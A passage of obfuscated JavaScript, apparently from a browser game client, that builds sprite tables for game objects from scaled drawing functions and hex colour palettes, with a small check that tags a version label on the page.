			ⵠⲆ[Ⲇ.ⵠⵠᐃᐃⲆ][ⲆᐃᐃⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆⲆΔΔⵠ(1.5 * ᐃ, true, ["#309cbd"]));
			ⵠⲆ[Ⲇ.ⵠⵠᐃᐃⲆ][ⲆⵠΔΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆⲆΔΔⵠ(ᐃ * 1.5, true, ["#309cbd"]));
			ⵠⲆ[Ⲇ.ⵠⵠᐃᐃⲆ][3][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆⲆΔΔⵠ(1.5 * ᐃ, true, ["#cd232d"]));
			ⵠⲆ[Ⲇ.ⵠⵠᐃᐃⲆ][ᐃᐃⲆΔⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆⲆΔΔⵠ(1.5 * ᐃ, ᐃΔᐃⵠΔ, ["#cd232d"]));
			ⵠⲆ[Ⲇ.ⵠⵠᐃᐃⲆ][Ⲇⵠⵠⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆⲆΔΔⵠ(ᐃ * 1.5, ⵠⲆⵠⵠΔ, ["#42b672"]));
			ⵠⲆ[Ⲇ.ⵠⵠᐃᐃⲆ][4][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆⲆΔΔⵠ(ᐃ * 1.5, ᐃᐃⲆᐃᐃ, ["#42b672"]));
			var ⲆᐃⲆⲆᐃⲆⲆᐃⲆ = ΔΔⲆᐃ.ⵠᐃⵠⵠⲆⲆΔ("cti", ᐃⲆᐃΔᐃⵠᐃ[ΔᐃⲆⵠⲆⵠΔ[71]][ΔᐃⲆⵠⲆⵠΔ[135]]);
			if (ⲆᐃⲆⲆᐃⲆⲆᐃⲆ) document[ΔᐃⲆⵠⲆⵠΔ[68]]("version")[ΔᐃⲆⵠⲆⵠΔ[290]] += "[CTI]";
			else ⵠᐃⵠ = function(ⲆⲆᐃⲆ) {
				ⲆⲆᐃⲆ.loaded = Ⲇᐃⵠ;
				return ⲆⲆᐃⲆ
			};
			ⵠⲆ[Ⲇ.ᐃⲆⲆⲆΔⲆⵠ] = ⵠᐃⵠ(ᐃⲆΔⲆᐃᐃᐃⲆΔ());
			ⵠⲆ[Ⲇ.ᐃⵠⲆⵠᐃ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠⲆⵠᐃ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠⲆⵠᐃ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ᐃⵠⲆⵠᐃ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ΔᐃⲆΔⲆⵠⵠ(ᐃ * 1.1, ᐃⵠⵠⲆᐃ, [ⵠ[446], "#c3d1cb", ⵠ[310]])));
			ⵠⲆ[Ⲇ.ᐃⵠⲆⵠᐃ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ΔᐃⲆΔⲆⵠⵠ(ᐃ * .9, ᐃⵠⵠᐃΔ, [ⵠ[446], "#c3d1cb", ⵠ[310]])));
			ⵠⲆ[Ⲇ.ᐃⵠⲆⵠᐃ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ΔᐃⲆΔⲆⵠⵠ(ᐃ * .6, false, [ⵠ[446], "#c3d1cb", ⵠ[310]])));
			ⵠⲆ[Ⲇ.ᐃⵠⲆⵠᐃ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ΔᐃⲆΔⲆⵠⵠ(ᐃ * 1.1, ᐃⵠⵠᐃΔ, [ⵠ[126], "#3c8e88", "#40a39b"])));
			ⵠⲆ[Ⲇ.ᐃⵠⲆⵠᐃ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ΔᐃⲆΔⲆⵠⵠ(.9 * ᐃ, false, [ⵠ[126], "#3c8e88", "#40a39b"])));
			ⵠⲆ[Ⲇ.ᐃⵠⲆⵠᐃ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ΔᐃⲆΔⲆⵠⵠ(.6 * ᐃ, false, [ⵠ[126], "#3c8e88", "#40a39b"])));
			ⵠⲆ[Ⲇ.ΔⲆⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ΔⲆⵠⵠ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ΔⲆⵠⵠ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ΔⲆⵠⵠ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ᐃⲆΔᐃⲆ(ᐃ * 1.5, false, [ⵠ[321], ⵠ[415], ⵠ[493]])));
			ⵠⲆ[Ⲇ.ΔⲆⵠⵠ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ᐃⲆΔᐃⲆ(1.3 * ᐃ, false, [ⵠ[321], ⵠ[415], ⵠ[493]])));
			ⵠⲆ[Ⲇ.ΔⲆⵠⵠ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ᐃⲆΔᐃⲆ(1.1 * ᐃ, ᐃᐃⵠΔⵠ, [ⵠ[321], ⵠ[415], ⵠ[493]])));
			ⵠⲆ[Ⲇ.ΔⲆⵠⵠ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ᐃⲆΔᐃⲆ(1.5 * ᐃ, false, [ⵠ[453], "#1b4444", "#16605a"])));
			ⵠⲆ[Ⲇ.ΔⲆⵠⵠ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ᐃⲆΔᐃⲆ(ᐃ * 1.3, false, [ⵠ[453], "#1b4444", "#16605a"])));
			ⵠⲆ[Ⲇ.ΔⲆⵠⵠ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ᐃⲆΔᐃⲆ(1.1 * ᐃ, ⵠΔⲆⲆⲆ, [ⵠ[453], "#1b4444", "#16605a"])));
			ⵠⲆ[Ⲇ.ΔⲆᐃΔ] = [];
			ⵠⲆ[Ⲇ.ΔⲆᐃΔ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ΔⲆᐃΔ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ΔⲆᐃΔ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⵠⲆⵠᐃⵠ(1.1 * ᐃ, false, [ⵠ[366], ⵠ[455], ⵠ[225]])));
			ⵠⲆ[Ⲇ.ΔⲆᐃΔ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⵠⲆⵠᐃⵠ(.9 * ᐃ, ⵠᐃⵠᐃᐃ, [ⵠ[366], ⵠ[455], ⵠ[225]])));
			ⵠⲆ[Ⲇ.ΔⲆᐃΔ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⵠⲆⵠᐃⵠ(ᐃ * .7, false, [ⵠ[366], ⵠ[455], ⵠ[225]])));
			ⵠⲆ[Ⲇ.ΔⲆᐃΔ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⵠⲆⵠᐃⵠ(ᐃ * 1.1, false, [ⵠ[453], ⵠ[62], "#57bcb5"])));
			ⵠⲆ[Ⲇ.ΔⲆᐃΔ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⵠⲆⵠᐃⵠ(.9 * ᐃ, ⲆⲆᐃⵠᐃ, [ⵠ[453], ⵠ[62], "#57bcb5"])));
			ⵠⲆ[Ⲇ.ΔⲆᐃΔ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⵠⲆⵠᐃⵠ(ᐃ * .7, false, [ⵠ[453], ⵠ[62], "#57bcb5"])));
			ⵠⲆ[Ⲇ.ⵠⵠᐃⲆᐃ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠᐃⲆᐃ][Ⲇ.ⲆⵠΔ] = ⲆΔ.ⵠΔⲆᐃⲆⲆΔ;
			ⵠⲆ[Ⲇ.ⵠⵠᐃⲆᐃ][Ⲇ.ΔⲆΔ] = ⲆΔ.ΔⵠⵠΔΔⲆᐃ;
			ⵠⲆ[Ⲇ.ΔᐃⲆᐃΔ] = [];
			ⵠⲆ[Ⲇ.ΔᐃⲆᐃΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔᐃⲆⲆⵠⵠⲆ(.6 * ᐃ, [ⵠ[111]]));
			ⵠⲆ[Ⲇ.ΔᐃⲆᐃΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔᐃⲆⲆⵠⵠⲆ(ᐃ * .6, [ⵠ[453]]));
			ⵠⲆ[Ⲇ.ΔᐃᐃⵠΔ] = [];
			ⵠⲆ[Ⲇ.ΔᐃᐃⵠΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ΔΔⵠⲆⲆⲆⲆ(ᐃ * .6, [ⵠ[543], ⵠ[229]]));
			ⵠⲆ[Ⲇ.ΔᐃᐃⵠΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ΔΔⵠⲆⲆⲆⲆ(ᐃ * .6, ["#1b1e30", "#161921"]));
			ⵠⲆ[Ⲇ.ⲆᐃⲆⵠᐃⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⲆⵠᐃⲆΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃⲆΔⲆᐃⲆⵠ(ᐃ * .6, ᐃⲆⲆᐃΔ, [ⵠ[111], "#759e6e", "#55604b", "#7d7252", "#575043"]));
			ⵠⲆ[Ⲇ.ⲆᐃⲆⵠᐃⲆΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃⲆΔⲆᐃⲆⵠ(.6 * ᐃ, true, [ⵠ[453], "#11635e", "#02373e", "#0b524d", "#07423f"]));
			ⵠⲆ[Ⲇ.ⵠⵠᐃⵠⲆΔⵠ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠᐃⵠⲆΔⵠ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆⵠᐃᐃΔⲆΔ(ᐃ * .6, true, [ⵠ[111], "#759e6e", "#55604b", "#f9ccd4", "#891a1e", "#da232e", "#a52026", "#a02d28", "#721819", ⵠ[210]]));
			ⵠⲆ[Ⲇ.ⵠⵠᐃⵠⲆΔⵠ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆⵠᐃᐃΔⲆΔ(.6 * ᐃ, ⵠⵠⲆⲆΔ, [ⵠ[453], "#11635e", "#02373e", "#167771", "#0c5752", "#401d49", "#2e1336", "#261336", "#23163c", ⵠ[210]]));
			ⵠⲆ[Ⲇ.ⵠⵠⲆΔΔⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⵠⵠⲆΔΔⵠΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ᐃᐃΔⵠⵠΔΔ(ᐃ * .4, [ⵠ[111], "#759e6e", "#55604b"]));
			ⵠⲆ[Ⲇ.ⵠⵠⲆΔΔⵠΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ᐃᐃΔⵠⵠΔΔ(.4 * ᐃ, [ⵠ[453], "#11635e", "#02373e"]));
			ⵠⲆ[Ⲇ.ΔΔⵠⵠΔⲆᐃ] = ⵠᐃⵠ(ⵠⲆⵠⲆᐃⲆⵠ(ᐃ * .6, [ⵠ[212]]));
			ⵠⲆ[Ⲇ.ΔΔᐃᐃⵠΔΔ] = ⵠᐃⵠ(ⵠⲆⵠⲆᐃⲆⵠ(.6 * ᐃ, ["#DBE71C"]));
			ⵠⲆ[Ⲇ.ᐃᐃⲆⲆΔᐃⵠ] = ⵠᐃⵠ(ⵠⲆⵠⲆᐃⲆⵠ(ᐃ * .6, ["#00BB00"]));
			ⵠⲆ[Ⲇ.ⲆΔΔΔ] = [];
			ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ⲆⵠΔ].push(ΔⲆᐃΔΔ(1.1 * ᐃ, ["#13402d", "#0f9862", "#0b8750", "#26ab6e"], ΔΔⵠⲆΔ, 0));
			ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ⲆⵠΔ].push(ΔⲆᐃΔΔ(1.1 * ᐃ, [ⵠ[434], "#0f9862", "#0b8750", "#26ab6e"], true, 0));
			ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ⲆⵠΔ].push(ΔⲆᐃΔΔ(ᐃ * .9, [ⵠ[434], "#0e7d4c", "#258a4d", "#248c4d"], false, 0));
			ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ⲆⵠΔ].push(ΔⲆᐃΔΔ(.9 * ᐃ, [ⵠ[434], ⵠ[180], "#1f7b43", "#1f7b43"], ᐃᐃⲆᐃᐃ, ⵠᐃⲆᐃ));
			ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ⲆⵠΔ].push(ΔⲆᐃΔΔ(.7 * ᐃ, [ⵠ[434], "#124c34", "#0E3D26", "#155136"], false, ⲆⲆⲆᐃ));
			ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ⲆⵠΔ].push(ΔⲆᐃΔΔ(ᐃ * .7, [ⵠ[434], "#124c34", "#0E3D26", "#155136"], ⲆⲆⲆΔⲆ, ⵠΔⲆⵠ));
			ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ΔⲆΔ].push(ΔⲆᐃΔΔ(ᐃ * 1.1, [ⵠ[453], ⵠ[325], ⵠ[118], ⵠ[548]], false, 0));
			ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ΔⲆΔ].push(ΔⲆᐃΔΔ(1.1 * ᐃ, [ⵠ[453], ⵠ[325], ⵠ[118], ⵠ[548]], ⵠⲆⵠⵠΔ, 0));
			ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ΔⲆΔ].push(ΔⲆᐃΔΔ(.9 * ᐃ, [ⵠ[453], "#0b3534", "#144443", "#174240"], ΔᐃⵠᐃⲆ, Ⲇᐃᐃᐃ));
			ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ΔⲆΔ].push(ΔⲆᐃΔΔ(ᐃ * .9, [ⵠ[453], "#0b3534", "#144443", "#174240"], true, 0));
			ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ΔⲆΔ].push(ΔⲆᐃΔΔ(.7 * ᐃ, [ⵠ[453], "#082b1f", "#073328", "#073327", "#16695f"], ⲆⵠΔⵠΔ, Δⵠᐃ));
			ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ΔⲆΔ].push(ΔⲆᐃΔΔ(.7 * ᐃ, [ⵠ[453], "#0c2823", "#0b2b23", "#0c2d24", "#16695f"], true, 0));
			ⵠⲆ[Ⲇ.ⲆⵠⲆⵠⵠ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠⲆⵠⵠ][Ⲇ.ⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠⲆⵠⵠ][Ⲇ.ΔⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠⲆⵠⵠ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⲆΔᐃⲆⵠⲆⵠ(ᐃⲆⵠΔΔΔᐃ(ᐃ * 1.1, [ⵠ[434], ⵠ[516], ⵠ[382], ⵠ[180], "#08562e", ⵠ[363]], ᐃⵠⵠᐃΔ), ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ⲆⵠΔ][0])));
			ⵠⲆ[Ⲇ.ⲆⵠⲆⵠⵠ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⲆΔᐃⲆⵠⲆⵠ(ᐃⲆⵠΔΔΔᐃ(1.1 * ᐃ, [ⵠ[434], ⵠ[516], ⵠ[382], ⵠ[180], "#08562e", ⵠ[363]], ⲆΔΔⲆΔ), ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ⲆⵠΔ][1])));
			ⵠⲆ[Ⲇ.ⲆⵠⲆⵠⵠ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⲆΔᐃⲆⵠⲆⵠ(ᐃⲆⵠΔΔΔᐃ(1.1 * ᐃ, [ⵠ[453], ⵠ[554], ⵠ[364], "#0a3333", ⵠ[119], ⵠ[119]], ΔΔⵠⲆΔ), ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ΔⲆΔ][0])));
			ⵠⲆ[Ⲇ.ⲆⵠⲆⵠⵠ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⲆΔᐃⲆⵠⲆⵠ(ᐃⲆⵠΔΔΔᐃ(ᐃ * 1.1, [ⵠ[453], ⵠ[554], ⵠ[364], "#0a3333", ⵠ[119], ⵠ[119]], ΔΔⲆⲆΔ), ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ΔⲆΔ][1])));
			ⵠⲆ[Ⲇ.ⲆⵠⲆⵠⵠ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⲆΔᐃⲆⵠⲆⵠ(ᐃⲆⵠΔΔΔᐃ(ᐃ * .9, [ⵠ[434], ⵠ[516], ⵠ[382], ⵠ[180], ⵠ[363], ⵠ[363]], false), ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ⲆⵠΔ][2])));
			ⵠⲆ[Ⲇ.ⲆⵠⲆⵠⵠ][Ⲇ.ⲆⵠΔ].push(ⵠᐃⵠ(ⲆΔᐃⲆⵠⲆⵠ(ᐃⲆⵠΔΔΔᐃ(.9 * ᐃ, [ⵠ[434], ⵠ[516], ⵠ[382], ⵠ[180], ⵠ[363], ⵠ[363]], ⵠᐃⲆᐃΔ), ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ⲆⵠΔ][2])));
			ⵠⲆ[Ⲇ.ⲆⵠⲆⵠⵠ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⲆΔᐃⲆⵠⲆⵠ(ᐃⲆⵠΔΔΔᐃ(.9 * ᐃ, [ⵠ[453], ⵠ[554], ⵠ[364], "#082b29", ⵠ[497], ⵠ[497]], false), ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ΔⲆΔ][ⲆᐃᐃⲆ])));
			ⵠⲆ[Ⲇ.ⲆⵠⲆⵠⵠ][Ⲇ.ΔⲆΔ].push(ⵠᐃⵠ(ⲆΔᐃⲆⵠⲆⵠ(ᐃⲆⵠΔΔΔᐃ(ᐃ * .9, [ⵠ[453], ⵠ[554], ⵠ[364], "#082b29", ⵠ[497], ⵠ[497]], true), ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ΔⲆΔ][3])));
			ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ⲆⵠΔ][5] = ⵠᐃⵠ(ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ⲆⵠΔ][ⵠᐃΔⵠ]);
			ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ⲆⵠΔ][ⲆⵠᐃΔ] = ⵠᐃⵠ(ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ⲆⵠΔ][ⵠΔΔᐃΔ]);
			ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ⲆⵠΔ][3] = ⵠᐃⵠ(ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ⲆⵠΔ][ⲆΔⵠⵠ]);
			ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ⲆⵠΔ][2] = ⵠᐃⵠ(ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ⲆⵠΔ][Ⲇᐃᐃⵠ]);
			ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ⲆⵠΔ][1] = ⵠᐃⵠ(ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ⲆⵠΔ][ΔΔᐃⵠ]);
			ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ⲆⵠΔ][0] = ⵠᐃⵠ(ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ⲆⵠΔ][ΔᐃΔΔ]);
			ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ΔⲆΔ][5] = ⵠᐃⵠ(ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ΔⲆΔ][5]);
			ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ΔⲆΔ][ΔᐃⵠⵠⲆ] = ⵠᐃⵠ(ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ΔⲆΔ][4]);
			ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ΔⲆΔ][ᐃⲆᐃᐃ] = ⵠᐃⵠ(ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ΔⲆΔ][3]);
			ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ΔⲆΔ][ⲆΔΔⵠ] = ⵠᐃⵠ(ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ΔⲆΔ][2]);
			ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ΔⲆΔ][ⲆⵠⲆⲆ] = ⵠᐃⵠ(ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ΔⲆΔ][ᐃᐃⵠ]);
			ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ΔⲆΔ][Δᐃᐃⵠ] = ⵠᐃⵠ(ⵠⲆ[Ⲇ.ⲆΔΔΔ][Ⲇ.ΔⲆΔ][0]);
			ⵠⲆ[Ⲇ.ΔᐃⲆΔⲆ] = [];
			ⵠⲆ[Ⲇ.ΔᐃⲆΔⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(4, ᐃⵠⲆᐃΔ(.75 * ᐃ, ΔᐃΔΔⵠ, [ⵠ[111], ⵠ[339], ⵠ[111], ⵠ[516], ⵠ[382], ⵠ[516], ⵠ[382]])));
			ⵠⲆ[Ⲇ.ΔᐃⲆΔⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ⲆⵠᐃⲆ, ᐃⵠⲆᐃΔ(.75 * ᐃ, ᐃⲆᐃᐃⲆ, [ⵠ[453], ⵠ[339], ⵠ[453], ⵠ[533], ⵠ[2], ⵠ[533], ⵠ[2]])));
			ⵠⲆ[Ⲇ.ⲆⵠᐃⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⲆⵠᐃⵠΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(4, ᐃⵠⲆᐃΔ(.75 * ᐃ, true, [ⵠ[111], ⵠ[339], ⵠ[111], ⵠ[516], ⵠ[382], ⵠ[24], ⵠ[237]])));
			ⵠⲆ[Ⲇ.ⲆⵠᐃⵠΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(Ⲇⵠⵠⵠ, ᐃⵠⲆᐃΔ(ᐃ * .75, true, [ⵠ[453], ⵠ[339], ⵠ[453], ⵠ[533], ⵠ[ⵠΔⲆᐃ], ⵠ[252], ⵠ[132]])));
			ⵠⲆ[Ⲇ.ΔΔⲆⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ΔΔⲆⵠⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ΔⲆⲆⲆ, ᐃⵠⲆᐃΔ(ᐃ * .75, ⵠᐃⲆᐃΔ, [ⵠ[111], ⵠ[339], ⵠ[111], ⵠ[400], ⵠ[330], ⵠ[104], ⵠ[193]])));
			ⵠⲆ[Ⲇ.ΔΔⲆⵠⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(4, ᐃⵠⲆᐃΔ(ᐃ * .75, ᐃⲆᐃᐃⲆ, [ⵠ[453], ⵠ[339], ⵠ[453], ⵠ[181], ⵠ[181], ⵠ[561], ⵠ[174]])));
			ⵠⲆ[Ⲇ.ⵠⲆⲆΔⲆ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆⲆΔⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(4, ᐃⵠⲆᐃΔ(.75 * ᐃ, ⵠⵠⲆⲆΔ, [ⵠ[111], ⵠ[339], ⵠ[111], ⵠ[435], ⵠ[76], ⵠ[226], ⵠ[448]])));
			ⵠⲆ[Ⲇ.ⵠⲆⲆΔⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ΔⲆⲆⲆ, ᐃⵠⲆᐃΔ(.75 * ᐃ, true, [ⵠ[453], ⵠ[339], ⵠ[453], ⵠ[522], ⵠ[357], ⵠ[74], ⵠ[102]])));
			ⵠⲆ[Ⲇ.ⵠⲆⵠΔᐃ] = [];
			ⵠⲆ[Ⲇ.ⵠⲆⵠΔᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(4, ᐃⵠⲆᐃΔ(.75 * ᐃ, ᐃⲆᐃᐃⲆ, [ⵠ[111], ⵠ[339], ⵠ[111], ⵠ[435], ⵠ[76], ⵠ[525], ⵠ[116]])));
			ⵠⲆ[Ⲇ.ⵠⲆⵠΔᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(4, ᐃⵠⲆᐃΔ(.75 * ᐃ, true, [ⵠ[453], ⵠ[339], ⵠ[453], ⵠ[522], ⵠ[357], ⵠ[436], ⵠ[459]])));
			ⵠⲆ[Ⲇ.ⲆᐃⲆⲆΔ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⲆⲆΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(3, ᐃⲆΔΔⲆᐃⲆ(ᐃ * .17, true, [ⵠ[111], "#4a3a22", "#362818", "#c7c7c7", "#909090", "#eceaea", ⵠ[408], "#d6d1d1"])));
			ⵠⲆ[Ⲇ.ⲆᐃⲆⲆΔ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(3, ᐃⲆΔΔⲆᐃⲆ(ᐃ * .17, true, [ⵠ[111], ⵠ[533], ⵠ[ΔⵠⵠΔ], "#59737d", "#364f59", "#618395", "#4d768c", "#54859f"])));
			ⵠⲆ[Ⲇ.ΔᐃⲆⵠⲆ] = [];
			ⵠⲆ[Ⲇ.ΔᐃⲆⵠⲆ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(3, ⲆⵠⲆⵠΔⵠⵠ(.32 * ᐃ, ⲆᐃΔⲆⲆ, [ⵠ[111], ⵠ[407], ⵠ[237], "#eb2933", "#57b74e", "#42a54d", ⵠ[223], ⵠ[374]])));
			ⵠⲆ[Ⲇ.ΔᐃⲆⵠⲆ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(3, ⲆⵠⲆⵠΔⵠⵠ(.42 * ᐃ, true, [ⵠ[111], ⵠ[252], ⵠ[132], ⵠ[533], ⵠ[2]])));
			ⵠⲆ[Ⲇ.ΔΔⵠᐃᐃ] = [];
			ⵠⲆ[Ⲇ.ΔΔⵠᐃᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ⲆᐃΔᐃ, ΔΔᐃⵠⲆⵠᐃ(.4 * ᐃ, ΔΔⲆⲆΔ, [ⵠ[111], ⵠ[48], "#493425", ⵠ[563], "#5e4530", "#473221", "#745840"])));
			ⵠⲆ[Ⲇ.ΔΔⵠᐃᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ⵠⲆΔⵠΔ, ΔΔᐃⵠⲆⵠᐃ(.4 * ᐃ, true, [ⵠ[111], "#0b3d3a", "#092b2a", "#144642", "#082927", ⵠ[540]])));
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔᐃ] = [];
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔᐃ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(ⵠⵠⵠⵠ, ᐃΔᐃⲆΔΔᐃ(ᐃ * .4, true, [ⵠ[111], ⵠ[24], ⵠ[237], "#b1afaf", "#493d36", "#332b28"])));
			ⵠⲆ[Ⲇ.ⲆᐃⵠΔᐃ][Ⲇ.ΔⲆΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(3, ᐃΔᐃⲆΔΔᐃ(.4 * ᐃ, true, [ⵠ[111], ⵠ[252], ⵠ[132], "#5d757e", ⵠ[533], ⵠ[ⲆⵠΔΔ]])));
			ⵠⲆ[Ⲇ.ⵠᐃⲆⵠΔ] = [];
			ⵠⲆ[Ⲇ.ⵠᐃⲆⵠΔ][Ⲇ.ⲆⵠΔ] = ⵠᐃⵠ(ⲆΔⲆΔ(3, ⵠⵠⲆⵠᐃⲆᐃ(.4 * ᐃ, ⲆⲆΔⲆⲆ, [ⵠ[111], ⵠ[104], ⵠ[193], ⵠ[104], ⵠ[400], ⵠ[330]])));
